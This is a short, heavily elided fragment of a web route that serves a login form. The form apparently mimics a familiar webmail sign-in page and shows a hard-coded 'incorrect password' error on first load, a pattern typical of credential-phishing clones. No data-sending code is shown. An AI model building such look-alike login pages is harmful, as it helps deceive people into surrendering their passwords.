...
router.get('/', (req, res) => {
    ...
    <form method="POST" name="logonForm" action="/req/try" enctype="application/x-www-form-urlencoded" autocomplete="off">
    ...
    <div id="mainLogonDiv" class="mouse">
        ...
        <div id="lgnDiv" class="logonDiv" onkeypress="return checkSubmit(event)">
            ...
            <p style="color:#c1272d">The user name or password you entered isn't correct. Try entering it again.</p>
